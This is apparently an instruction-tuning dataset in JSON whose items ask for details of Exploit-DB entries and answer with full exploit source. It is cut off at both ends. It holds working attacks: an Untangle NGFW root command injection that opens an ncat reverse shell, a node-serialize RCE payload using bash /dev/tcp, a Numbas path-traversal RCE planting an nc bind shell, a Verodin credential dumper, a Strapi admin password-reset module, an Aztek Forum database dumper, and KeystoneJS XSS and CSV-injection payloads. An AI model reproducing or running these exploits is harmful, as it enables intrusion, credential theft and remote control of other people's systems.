            "Exploit": "#!/usr/bin/python\n\n# Title:       Untangle NGFW <= v12.1.0 beta execEvil() authenticated root CI exploit\n# CVE:        (Not yet assigned)\n# Discovery:      Matt Bush (@3xocyte)\n# Exploit:      Matt Bush\n# Contact:      mbush@themissinglink.com.au\n\n# Disclosure Timeline:\n# 22/4/2016      Attempted to contact vendor after discovery of vulnerabilities\n# 6/5/2016      No response from vendor, vulnerabilities reported to US-CERT (assigned VU#538103)\n# 12/5/2016      US-CERT confirms contacting vendor\n# 16/6/2016      US-CERT notifies of no response from vendor and suggests requesting CVE-ID following their timeline\n# 27/6/2016       Public disclosure\n\n# A command injection vulnerability exists in Untangle NG Firewall, which allows non-root authenticated users to execute system commands with\n# root privileges. This exploit has been tested on Untangle NG Firewall versions 11.2, 12, 12.0.1, and 12.1.0 beta, but should work on previous\n# versions. The client-side sanitisation issues identified in the disclosure post can be exploited with a web app proxy. This exploit leverages\n# the vulnerable function directly. Credentials can be obtained by sniffing unsecured HTTP logins (which the appliance defaults to).\n\n# The author is not responsible for how this script or any information within this script is used. Don't do anything stupid.\n\nimport json, requests, sys\n\nif len(sys.argv) < 5:\n  print \"[!] usage: \" + sys.argv[0] + \" <RHOST> <LHOST> <username> <password>\"\n  print \"[!] and in a separate terminal: 'ncat --ssl -nlvp 443'\"\n  sys.exit()\n\nprint \"\\nUntangle NGFW <= v12.0.1 execEvil() authenticated root CI exploit\"\nprint \"                          by @3xocyte\\n\"\n\nrhost = sys.argv[1]\nlhost = sys.argv[2]\nusername = sys.argv[3]\npassword = sys.argv[4]\n\nlogin_url = \"http://\" + rhost + \"/auth/login?url=/webui&realm=Administrator\"\nrpc_url = \"http://\" + rhost + \"/webui/JSON-RPC\"\nauth = {'username': username, 'password': password}\n\nprint \"[*] Opening session...\"\nsession = requests.Session()\n\nprint \"[*] Authenticating...\"\ntry:\n  login = session.post(login_url, data=auth)\n  get_nonce = {\"id\":1,\"nonce\":\"\",\"method\":\"system.getNonce\",\"params\":[]}\n  req_nonce = session.post(rpc_url, data=json.dumps(get_nonce))\n  data = json.loads(req_nonce.text)\n  nonce = data['result']\nexcept:\n  print \"[!] Authentication failed. Quitting.\"\n  sys.exit()\n\nprint \"[*] Getting execManager objectID...\"\ntry:\n  get_obj_id = {\"id\":2,\"nonce\":nonce,\"method\":\"UvmContext.getWebuiStartupInfo\",\"params\":[]}\n  req_obj_id = session.post(rpc_url, data=json.dumps(get_obj_id))\n  data = json.loads(req_obj_id.text)\n  object_id = data['result']['execManager']['objectID']\n\nexcept:\n  print \"[!] Could not get execManager objectID. Quitting.\"\n  sys.exit()\n\nprint \"[*] Exploiting Ung.Main.getExecManager().execEvil()...\"\ntry:\n  exploit = {\"id\":3,\"nonce\":nonce,\"method\":\".obj#\" + str(object_id) + \".execEvil\",\"params\":[\"ncat --ssl -e /bin/sh \" + lhost + \" 443\"]}\n  session.post(rpc_url, data=json.dumps(exploit))\nexcept:\n  print \"[!] Exploit failed. Quitting.\"\n  sys.exit()\n\nprint \"[*] Exploit sent!\""
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 48002",
        "output": {
            "ID": "48002",
            "File": "exploits/json/webapps/48002.py",
            "Description": "Verodin Director Web Console 3.5.4.0 - Remote Authenticated Password Disclosure (PoC)",
            "Date Published": "2020-02-05",
            "Author": "nxkennedy",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2020-02-05",
            "Date Updated": "2020-02-05",
            "Verified": "0",
            "Codes": [
                "CVE-2019-10716"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "#  Exploit Title: Verodin Director Web Console 3.5.4.0 - Remote Authenticated Password Disclosure (PoC)\n#  Discovery Date: 2019-01-31\n#  Exploit Author: Nolan B. Kennedy (nxkennedy)\n#  Vendor Homepage: https://www.verodin.com/\n#  Software Link : https://www.verodin.com/demo-request/demo-request-form\n#  Tested Versions: v3.5.1.0, v3.5.2.0, v3.5.3.1\n#  Tested On: Windows\n#  CVE: CVE-2019-10716\n#  Vulnerability Type: Sensitive Data Disclosure\n###\n# Description: Verodin Director's REST API allows authenticated users to query the configuration\n#       details, which include credentials, of any 50+ possible integrated security tools (e.g. Splunk, ArcSight, Palo Alto, AWS Cloud Trail).\n#       Fortunately for attackers, members of 3 out of the 4 user groups in the Director can query this info (Users, Power Users, System Admin).\n#\n#       API Request: GET https://<director-ip>/integrations.json\n#\n# Usage: python3 script.py\n#\n# Example Output:\n#\n#       -- VERODIN DIRECTOR WEB CONSOLE < V3.5.4.0 - REMOTE AUTHENTICATED PASSWORD DISCLOSURE (POC) --\n#\t-- Author: Nolan B. Kennedy (nxkennedy) --\n#\n#\n#       [+] Director Version\n#       =====================\n#       [*] Detected version 3.5.1.0 is VULNERABLE! :)\n#\n#\n#       [+] Account Permissions\n#       ========================\n#       [*] \"admin@verodin.com\" is a member of \"System Admin\"\n#\n#\n#       [+] Verodin Integrations\n#       =========================\n#       [*] Product: splunk\n#       [*] Username: splunk_svc_acct\n#       [*] Misc (may include credentials): [{'scheme': 'https', 'basic': False, 'password': 'Sup3rP@ssw0rd',\n#       'port': 8089, 'host': '10.0.0.6', 'username': 'splunk_svc_acct'},\n#       {'proxy_hash': None}]\n#\n#       [*] Product: arcsight\n#       [*] Username: arcsight_admin\n#       [*] Misc (may include credentials): ['10.0.0.7', 8443, 'https', 'arcsight_admin', 'Sup3rP@ssw0rd',\n#       \"/All Filters/Personal/integration_user's filters/Verodin Filter\", 'Verodin Query Viewer', 60]\n#\n#       [+] Done!\n###\n\nimport base64\nfrom distutils.version import LooseVersion\nimport json\nimport re\nimport ssl\nfrom sys import exit\nfrom time import sleep\nimport urllib.request\n\n\n\n\nverodin_ip = '0.0.0.0'\n# Default System Admin creds. Worth a try.\nusername = 'admin@verodin.com'\npassword = 'Ver0d!nP@$$'\nbase_url = 'https://{}'.format(verodin_ip)\nfixed_version = '3.5.4.0'\n\n\n# We'll be making 3 different requests so we need a web handling function\ndef requests(target, html=False):\n\n        url = base_url + target\n        context = ssl._create_unverified_context() # so we don't get an ssl cert error\n        req  = urllib.request.Request(url)\n        credentials = ('{}:{}'.format(username, password))\n        encoded_credentials = base64.b64encode(credentials.encode('ascii'))\n        req.add_header('Authorization', 'Basic %s' % encoded_credentials.decode(\"ascii\")) # use %s instead of format because errors\n        r = urllib.request.urlopen(req, context=context)\n        content = r.read().decode('utf-8')\n        if r.getcode() == 200:\n                # we don't always get a 401 if auth fails\n                if 'Cookies need to be enabled' in content:\n                        print('[!] Failed to retrieve data: Credentials incorrect/invalid')\n                        print()\n                        print('[!] Exiting...')\n                        exit(1)\n                elif html:\n                        blob = content\n                else:\n                        blob = json.loads(content)\n                return blob\n        elif r.getcode() == 401:\n                print('[!] Failed to retrieve data: Credentials incorrect/invalid')\n                print()\n                print('[!] Exiting...')\n                exit(1)\n        else:\n                print('[!] ERROR: Status Code {}'.format(r.getcode()))\n                exit(1)\n\n\n# Do we have permissions to retrieve the creds?\ndef getUserPerms():\n\n\ttarget = '/users/user_prefs.json'\n\tr = requests(target) # returns a single json dict\n\tprint('\\n[+] Account Permissions')\n\tprint('========================')\n\tgroup_id = r['user_group_id']\n\troles = {'Reporting': 4, 'Users': 3, 'Power Users': 2, 'System Admin': 1}\n\tfor role,value in roles.items():\n\t\tif group_id == value:\n\t\t\tprint('[*] \"{}\" is a member of \"{}\"'.format(username, role))\n\t\t\tprint()\n\t\t\tif group_id == 4:\n\t\t\t\tprint('[!] This account does not have sufficient privs. You need \"Users\" or higher.')\n\t\t\t\tprint()\n\t\t\t\tprint('[!] Exiting...')\n\t\t\t\texit(1)\n\tsleep(0.5)\n\n\n# We need to verify the target Director is running a vulnerable version\ndef checkVuln():\n\n\ttarget = '/settings/system'\n\tr = requests(target, html=True)\n\tfield = re.search(r'Director\\sVersion:.*', r)\n\tversion = field.group().split('<')[0].split(\" \")[2]\n\tprint('\\n[+] Director Version')\n\tprint('=====================')\n\tif LooseVersion(version) < LooseVersion(fixed_version):\n\t\tprint('[*] Detected version {} is VULNERABLE! :)'.format(version))\n\t\tprint()\n\telse:\n\t\tprint('[!] Detected version {} is not vulnerable. Must be < {}'.format(version, fixed_version))\n\t\tprint()\n\t\tprint('[!] Exiting...')\n\n\tsleep(0.5)\n\n\n# Where we parse out any creds or other useful info\ndef getLoot():\n\n        target = '/integrations.json'\n        r = requests(target)  # a list of json dicts\n        print('\\n[+] Verodin Integrations')\n        print('=========================')\n        if not r:\n                print('[+] Dang! No integrations configured in this Director :(')\n                print()\n        else:\n                for integration in r:\n                        product = integration['package_name'] # constant key\n                        misc = integration.get('new_client_args') # we use .get to return a None type if the key doesn't exist\n                        user = integration.get('username')\n                        passw = integration.get('password')\n                        token = integration.get('auth_token')\n                        print('[*] Product: {}'.format(product))\n                        if user:\n                                print('[*] Username: {}'.format(user))\n                        if passw:\n                                print('[*] Password: {}'.format(passw))\n                        if token and token is not 'null':\n                                print('[*] Auth Token: {}'.format(token))\n                        if misc:\n                                print('[*] Misc (may include credentials): {}'.format(misc))\n                        print()\n        sleep(0.5)\n\n\ndef main():\n\n\tprint('\\n-- Verodin Director Web Console < v3.5.4.0 - Remote Authenticated Password Disclosure (PoC) --'.upper())\n\tprint('-- Author: Nolan B. Kennedy (nxkennedy) --')\n\tprint()\n\tcheckVuln()\n\tgetUserPerms()\n\tgetLoot()\n\tprint('[+] Done!')\n\n\nif __name__ == '__main__':\n\tmain()"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 43054",
        "output": {
            "ID": "43054",
            "File": "exploits/nodejs/webapps/43054.txt",
            "Description": "KeystoneJS 4.0.0-beta.5 - Cross-Site Scripting",
            "Date Published": "2017-10-25",
            "Author": "Ishaq Mohammed",
            "Type": "webapps",
            "Platform": "nodejs",
            "Port": "",
            "Date Added": "2017-10-25",
            "Date Updated": "2017-10-25",
            "Verified": "0",
            "Codes": [
                "CVE-2017-15878"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: KeystoneJS 4.0.0-beta.5 Unauthenticated Stored XSS\n# Vendor Homepage: http://keystonejs.com/\n# Exploit Author: Ishaq Mohammed\n# Contact: https://twitter.com/security_prince\n# Website: https://about.me/security-prince\n# Category: WEBAPPS\n# Platform: Node.js\n# CVE: CVE-2017-15878\n\nVendor Description:\n\nKeystoneJS is a powerful Node.js content management system and web app\nframework built on express and mongoose. Keystone makes it easy to create\nsophisticated web sites and apps, and comes with a beautiful auto-generated\nAdmin UI.\nSource: https://github.com/keystonejs/keystone/blob/master/README.md\n\nTechnical Details and Exploitation:\n\nA cross-site scripting (XSS) vulnerability exists in\nfields/types/markdown/MarkdownType.js in KeystoneJS before 4.0.0-beta.7 via\nthe Contact Us feature.\n\nhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15878\n\nProof of Concept:\n\n1. Navigate to Contact Us page\n2. Fill in the details needed and enter the below payload in message field\nand send\n<a onmouseover=alert(document.cookie)>XSS link</a>\n3. Now login as admin and navigate to the above new record created in the\nenquiries\n4. Move the cursor on the text \u201cXSS link\u201d\n\nSolution:\n\nThe issues have been fixed and the vendor has released the patches\n\nhttps://github.com/keystonejs/keystone/pull/4478/commits/5cb6405dfc0b6d59003c996f8a4aa35baa6b2bac\n\nReference:\n\nhttps://github.com/keystonejs/keystone/pull/4478\nhttps://securelayer7.net/download/pdf/KeystoneJS-Pentest-Report-SecureLayer7.pdf"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 43053",
        "output": {
            "ID": "43053",
            "File": "exploits/nodejs/webapps/43053.txt",
            "Description": "KeystoneJS 4.0.0-beta.5 - CSV Excel Macro Injection",
            "Date Published": "2017-10-25",
            "Author": "Ishaq Mohammed",
            "Type": "webapps",
            "Platform": "nodejs",
            "Port": "",
            "Date Added": "2017-10-25",
            "Date Updated": "2017-10-25",
            "Verified": "0",
            "Codes": [
                "CVE-2017-15879"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: KeystoneJS 4.0.0-beta.5 Unauthenticated CSV Injection\n# Vendor Homepage: http://keystonejs.com/\n# Exploit Author: Ishaq Mohammed\n# Contact: https://twitter.com/security_prince\n# Website: https://about.me/security-prince\n# Category: WEBAPPS\n# Platform: Node.js\n# CVE: CVE-2017-15879\n\nVendor Description:\n\nKeystoneJS is a powerful Node.js content management system and web app\nframework built on express and mongoose. Keystone makes it easy to create\nsophisticated web sites and apps, and comes with a beautiful auto-generated\nAdmin UI.\nSource: https://github.com/keystonejs/keystone/blob/master/README.md\n\nTechnical Details and Exploitation:\n\nCSV Injection (aka Excel Macro Injection or Formula Injection) exists in\nadmin/server/api/download.js and lib/list/getCSVData.js in KeystoneJS\nbefore 4.0.0-beta.7 via a value that is mishandled in a CSV export.\n\nhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15879\n\nProof of Concept:\n\n1.Go to Contact Us page and insert the below payload in the Name Field.\nPayload: @SUM(1+1)*cmd|' /C calc'!A0\n2. Login as Admin\n3. Now Navigate to Enquiries page and check the entered payload.\n4. Download as .csv, once done open it in excel and observe that calculator\napplication gets open.\n\n\nSolution:\n\nThe issues have been fixed and the vendor has released the patches\nhttps://github.com/keystonejs/keystone/pull/4478/commits/1b791d55839ebf434e104cc9936ccb8c29019231\n\nReference:\n\nhttps://github.com/keystonejs/keystone/pull/4478\nhttps://securelayer7.net/download/pdf/KeystoneJS-Pentest-Report-SecureLayer7.pdf\n\n--\nBest Regards,\nIshaq Mohammed\nhttps://about.me/security-prince"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 49552",
        "output": {
            "ID": "49552",
            "File": "exploits/nodejs/webapps/49552.py",
            "Description": "Node.JS - 'node-serialize' Remote Code Execution (2)",
            "Date Published": "2021-02-10",
            "Author": "UndeadLarva",
            "Type": "webapps",
            "Platform": "nodejs",
            "Port": "",
            "Date Added": "2021-02-10",
            "Date Updated": "2021-02-10",
            "Verified": "0",
            "Codes": [
                "CVE-2017-5941"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Node.JS - 'node-serialize' Remote Code Execution (2)\n# Exploit Author: UndeadLarva\n# Software Link: https://www.npmjs.com/package/node-serialize\n# Version: 0.0.4\n# CVE: CVE-2017-5941\n\nimport requests\nimport re\nimport base64\nimport sys\n\nurl = 'http://192.168.100.133:8000/' # change this\n\npayload = (\"require('http').ServerResponse.prototype.end = (function (end) {\"\n\"return function () {\"\n\"['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));\"\n\"console.log('still inside');\"\n\"const { exec } = require('child_process');\"\n\"exec('bash -i >& /dev/tcp/192.168.200.5/445 0>&1');\" # change this\n\"}\"\n\"})(require('http').ServerResponse.prototype.end)\")\n\n# rce = \"_$$ND_FUNC$$_process.exit(0)\"\n# code =\"_$$ND_FUNC$$_console.log('behind you')\"\ncode = \"_$$ND_FUNC$$_\" + payload\n\nstring = '{\"username\":\"TheUndead\",\"country\":\"worldwide\",\"city\":\"Tyr\", \"exec\": \"'+code+'\"}'\n\ncookie = {'profile':base64.b64encode(string)}\n\ntry:\n    response = requests.get(url, cookies=cookie).text\n    print response\nexcept requests.exceptions.RequestException as e:\n    print('Oops!')\n    sys.exit(1)"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 51867",
        "output": {
            "ID": "51867",
            "File": "exploits/nodejs/webapps/51867.txt",
            "Description": "Numbas < v7.3 - Remote Code Execution",
            "Date Published": "2024-03-10",
            "Author": "Matheus Alexandre",
            "Type": "webapps",
            "Platform": "nodejs",
            "Port": "",
            "Date Added": "2024-03-10",
            "Date Updated": "2024-03-10",
            "Verified": "0",
            "Codes": [
                "CVE-2024-27612"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Numbas < v7.3 - Remote Code Execution\n# Google Dork: N/A\n# Date: March 7th, 2024\n# Exploit Author: Matheus Boschetti\n# Vendor Homepage: https://www.numbas.org.uk/\n# Software Link: https://github.com/numbas/Numbas\n# Version: 7.2 and below\n# Tested on: Linux\n# CVE: CVE-2024-27612\n\nimport sys, requests, re, argparse, subprocess, time\nfrom bs4 import BeautifulSoup\n\ns = requests.session()\n\ndef getCSRF(target):\n    url = f\"http://{target}/\"\n    req = s.get(url)\n    soup = BeautifulSoup(req.text, 'html.parser')\n    csrfmiddlewaretoken = soup.find('input', attrs={'name': 'csrfmiddlewaretoken'})['value']\n    return csrfmiddlewaretoken\n\ndef createTheme(target):\n    # Format request\n    csrfmiddlewaretoken = getCSRF(target)\n    theme = 'ExampleTheme'\n    boundary = '----WebKitFormBoundaryKUMXsLP31HzARUV1'\n    data = (\n        f'--{boundary}\\r\\n'\n        'Content-Disposition: form-data; name=\"csrfmiddlewaretoken\"\\r\\n'\n        '\\r\\n'\n        f'{csrfmiddlewaretoken}\\r\\n'\n        f'--{boundary}\\r\\n'\n        'Content-Disposition: form-data; name=\"name\"\\r\\n'\n        '\\r\\n'\n        f'{theme}\\r\\n'\n        f'--{boundary}--\\r\\n'\n    )\n    headers = {'Content-Type': f'multipart/form-data; boundary={boundary}',\n               'User-Agent': 'Mozilla/5.0',\n               'Accept': '*/*',\n               'Connection': 'close'}\n\n    # Create theme and return its ID\n    req = s.post(f\"http://{target}/theme/new/\", headers=headers, data=data)\n    redir = req.url\n    split = redir.split('/')\n    id = split[4]\n    print(f\"\\t[i] Theme created with ID {id}\")\n    return id\n\ndef login(target, user, passwd):\n    print(\"\\n[i] Attempting to login...\")\n\n    csrfmiddlewaretoken = getCSRF(target)\n    data = {'csrfmiddlewaretoken': csrfmiddlewaretoken,\n            'username': user,\n            'password': passwd,\n            'next': '/'}\n\n    # Login\n    login = s.post(f\"http://{target}/login/\", data=data, allow_redirects=True)\n    res = login.text\n    if(\"Logged in as\" not in res):\n        print(\"\\n\\n[!] Login failed!\")\n        sys.exit(-1)\n\n    # Check if logged and fetch ID\n    usermatch = re.search(r'Logged in as <strong>(.*?)</strong>', res)\n    if usermatch:\n        user = usermatch.group(1)\n        idmatch = re.search(r'<a href=\"/accounts/profile/(.*?)/\"><span class=\"glyphicon glyphicon-user\">', res)\n        if idmatch:\n            id = idmatch.group(1)\n            print(f\"\\t[+] Logged in as \\\"{user}\\\" with ID {id}\")\n\ndef checkVuln(url):\n    print(\"[i] Checking if target is vulnerable...\")\n\n    # Attempt to read files\n    themeID = createTheme(url)\n    target = f\"http://{url}/themes/{themeID}/edit_source?filename=../../../../../../../../../..\"\n    hname = s.get(f\"{target}/etc/hostname\")\n    ver = s.get(f\"{target}/etc/issue\")\n    hnamesoup = BeautifulSoup(hname.text, 'html.parser')\n    versoup = BeautifulSoup(ver.text, 'html.parser')\n    hostname = hnamesoup.find('textarea').get_text().strip()\n    version = versoup.find('textarea').get_text().strip()\n    if len(hostname) < 1:\n        print(\"\\n\\n[!] Something went wrong - target might not be vulnerable.\")\n        sys.exit(-1)\n    print(f\"\\n[+] Target \\\"{hostname}\\\" is vulnerable!\")\n    print(f\"\\t[i] Running: \\\"{version}\\\"\")\n\n    # Cleanup - delete theme\n    print(f\"\\t\\t[i] Cleanup: deleting theme {themeID}...\")\n    target = f\"http://{url}/themes/{themeID}/delete\"\n    csrfmiddlewaretoken = getCSRF(url)\n    data = {'csrfmiddlewaretoken':csrfmiddlewaretoken}\n    s.post(target, data=data)\n\n\ndef replaceInit(target):\n    # Overwrite __init__.py with arbitrary code\n    rport = '8443'\n    payload = f\"import subprocess;subprocess.Popen(['nc','-lnvp','{rport}','-e','/bin/bash'])\"\n    csrfmiddlewaretoken = getCSRF(target)\n    filename = '../../../../numbas_editor/numbas/__init__.py'\n    themeID = createTheme(target)\n    data = {'csrfmiddlewaretoken': csrfmiddlewaretoken,\n            'source': payload,\n            'filename': filename}\n\n    print(\"[i] Delivering payload...\")\n    # Retry 5 times in case something goes wrong...\n    for attempt in range(5):\n        try:\n            s.post(f\"http://{target}/themes/{themeID}/edit_source\", data=data, timeout=10)\n        except Exception as e:\n            pass\n\n    # Establish connection to bind shell\n    time.sleep(2)\n    print(f\"\\t[+] Payload delivered, establishing connection...\\n\")\n    if \":\" in target:\n        split = target.split(\":\")\n        ip = split[0]\n    else:\n        ip = str(target)\n    subprocess.Popen([\"nc\", \"-n\", ip, rport])\n    while True:\n        pass\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    if len(sys.argv) <= 1:\n        print(\"\\n[!] No option provided!\")\n        print(\"\\t- check: Passively check if the target is vulnerable by attempting to read files from disk\\n\\t- exploit: Attempt to actively exploit the target\\n\")\n        print(f\"[i] Usage: python3 {sys.argv[0]} <option> --target 172.16.1.5:80 --user example --passwd qwerty\")\n        sys.exit(-1)\n\n    group = parser.add_mutually_exclusive_group(required=True)\n    group.add_argument('action', nargs='?', choices=['check', 'exploit'], help='Action to perform: check or exploit')\n    parser.add_argument('--target', help='Target IP:PORT')\n    parser.add_argument('--user', help='Username to authenticate')\n    parser.add_argument('--passwd', help='Password to authenticate')\n    args = parser.parse_args()\n    action = args.action\n    target = args.target\n    user = args.user\n    passwd = args.passwd\n\n    print(\"\\n\\t\\t-==[ CVE-2024-27612: Numbas Remote Code Execution (RCE) ]==-\")\n\n    if action == 'check':\n        login(target, user, passwd)\n        checkVuln(target)\n    elif action == 'exploit':\n        login(target, user, passwd)\n        replaceInit(target)\n    else:\n        sys.exit(-1)\n\n\nif __name__ == \"__main__\":\n    main()"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 50716",
        "output": {
            "ID": "50716",
            "File": "exploits/nodejs/webapps/50716.rb",
            "Description": "Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)",
            "Date Published": "2022-02-08",
            "Author": "WackyH4cker",
            "Type": "webapps",
            "Platform": "nodejs",
            "Port": "",
            "Date Added": "2022-02-08",
            "Date Updated": "2022-02-08",
            "Verified": "0",
            "Codes": [
                "CVE-2019-18818"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "##\n# This module requires Metasploit: http://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core'\n\nclass MetasploitModule < Msf::Auxiliary\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n\n      'Name'           => \"Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)\",\n      'Description'    => %q{\n        This exploit module abuses the mishandling of password reset in JSON for Strapi CMS version 3.0.0-beta.17.4 to change the password of a privileged user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'WackyH4cker' ],\n      'References'     =>\n        [\n          [ 'URL', 'https://vulners.com/cve/CVE-2019-18818' ]\n        ],\n      'Platform'       => 'linux',\n      'Targets'        => [\n        [ 'Strapi 3.0.0-beta-17.4', {} ]\n      ],\n      'Payload'        => '',\n      'Privileged'     => true,\n      'DisclosureDate' => \"\",\n      'DefaultOptions' =>\n        {\n          'SSL' => 'False',\n          'RPORT' => 80,\n        },\n      'DefaultTarget'  => 0\n\n      ))\n\n      register_options [\n        OptString.new('NEW_PASSWORD', [true, 'New password for user Admin'])\n      ]\n  end\n\n  def check\n\n    res = send_request_raw({ 'uri' => '/admin/init' })\n    version = JSON.parse(res.body)\n\n    if version[\"data\"][\"strapiVersion\"] == '3.0.0-beta.17.4'\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n  end\n\n  def run\n\n    json_body = { 'code' => {'$gt' => 0},\n      'password' => datastore['NEW_PASSWORD'],\n      'passwordConfirmation' => datastore['NEW_PASSWORD'] }\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => '/admin/auth/reset-password',\n      'ctype' => 'application/json',\n      'data' => JSON.generate(json_body)\n    })\n\n    print_status(\"Changing password...\")\n    json_format = JSON.parse(res.body)\n    jwt = json_format['jwt']\n\n    if res.code == 200\n      print_good(\"Password changed successfully!\")\n      print_good(\"USER: admin\")\n      print_good(\"PASSWORD: #{datastore['NEW_PASSWORD']}\")\n      print_good(\"JWT: #{jwt}\")\n    else\n      fail_with(Failure::NoAccess\"Could not change admin user password\")\n    end\n  end\n\nend"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 860",
        "output": {
            "ID": "860",
            "File": "exploits/php/webapps/860.c",
            "Description": "Aztek Forum 4.0 - 'myadmin.php' Database Dumper",
            "Date Published": "2005-03-07",
            "Author": "sirius_black",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-03-06",
            "Date Updated": "",
            "Verified": "1",
            "Codes": [
                "OSVDB-14632;CVE-2005-0700"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "/* Changed line 81 - Tested and working /str0ke */\n\n/*\n *   LOTFREE Team presents :\n * Forum-Aztek v4.0 (4nd pr0b4bly inf3ri0r) Database Dump Xpl0it\n * 0day dUd3 X-)\n *\n * ./aztek-sploit 127.0.0.1 admin forum\n * HTTP/1.1 200 OK\n * Date: Sat, 05 Mar 2005 22:18:13 GMT\n * Server: Apache/2.0.50 (Ubuntu) PHP/4.3.8\n * X-Powered-By: PHP/4.3.8\n * Set-Cookie: ATK_ADMIN=\n * Expires: Sat, 05 Mar 2005 22:18:13 GMT\n * Content-Disposition: attachment; filename=\"backup-admin-2005-5-03-23-18-13.sql\"\n * Connection: close\n * Transfer-Encoding: chunked\n * Content-Type: application/force-download\n *\n * (...)\n * INSERT INTO atk_users VALUES ('admin','admin','atm5zzHCTXNkc',0,'',0,0,0,'','',0,0,'','',1109861125,63,'0','','','','','',0,0,'');\n *                            password in DES ---+^^^^^^^^^^^^^\n * (...)\n * sw333333t !\n * http://lotfree.next-touch.com\n */\n#include <stdlib.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <errno.h>\n#include <netinet/in.h>\n#include <netdb.h>\n#include <arpa/inet.h>\n#include <string.h>\n\n#define REQ1 \"/myadmin.php?action=export_index&login=\"\n#define REQ2 \" HTTP/1.1\\nHost: \"\n#define REQ3 \"\\nCookie: ATK_ADMIN=blah; ATK_LOGIN=\"\n#define REQ4 \"\\nConnection: close\\n\\n\"\n\nunsigned long resolve (char *host)\n{\n  struct in_addr in;\n  struct hostent *he;\n\n  if((in.s_addr=inet_addr(host))==-1)\n  {\n    if((he=(struct hostent*)gethostbyname(host))==NULL)\n    {\n      herror(\"Resolving victim host\");\n      exit(1);\n    }\n    memcpy((caddr_t)&in, he->h_addr, he->h_length);\n  }\n  return(in.s_addr);\n}\n\nint main(int argc,char *argv[])\n{\n  int sock;\n  struct sockaddr_in sin;\n  char c;\n\n  if(argc!=4)\n  {\n    printf(\"[*]--------------------------------[*]\\n\");\n    printf(\" | Aztek-Forum Database Dump Xploit |\\n\");\n    printf(\" |   sirius_black // LOTFREE Team   |\\n\");\n    printf(\"[*]--------------------------------[*]\\n\\n\");\n    printf(\"Usage: %s <victim> <admin_login> <forum_directory>\\n\\n\",argv[0]);\n    printf(\"Exemple: %s www.tictactoe.com admin forum > database.sql\\n\\n\",argv[0]);\n    exit(1);\n  }\n  if((sock=socket(PF_INET,SOCK_STREAM,0))==-1)\n  {\n    perror(\"socket\");\n    exit(1);\n  }\n  sin.sin_family=AF_INET;\n  sin.sin_port=htons(80);\n  sin.sin_addr.s_addr=resolve(argv[1]);//  sin.sin_addr.s_addr=resolve(\"127.0.0.1\");\n  if(connect(sock,(struct sockaddr*)&sin,sizeof(struct sockaddr))==-1)\n  {\n    perror(\"connect\");\n    exit(1);\n  }\n  send(sock,\"GET /\",5,0);\n  send(sock,argv[3],strlen(argv[3]),0);\n  send(sock,REQ1,sizeof(REQ1)-1,0);\n  send(sock,argv[2],strlen(argv[2]),0);\n  send(sock,REQ2,sizeof(REQ2)-1,0);\n  send(sock,argv[1],strlen(argv[1]),0);\n  send(sock,REQ3,sizeof(REQ3)-1,0);\n  send(sock,argv[2],strlen(argv[2]),0);\n  send(sock,REQ4,sizeof(REQ4)-1,0);\n  while((recv(sock,&c,1,0))==1)\n  {\n    putchar(c);\n  }\n  close(sock);\n  return 0;\n}\n\n// milw0rm.com [2005-03-07]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 809",
        "output": {
            "ID": "809",
            "File": "exploits/php/webapps/809.txt",
            "Description": "Chipmunk Forums - SQL Injection",
            "Date Published": "2005-02-10",
            "Author": "GHC",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-02-09",
            "Date Updated": "",
            "Verified": "1",
            "Codes": [
                "OSVDB-13568"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
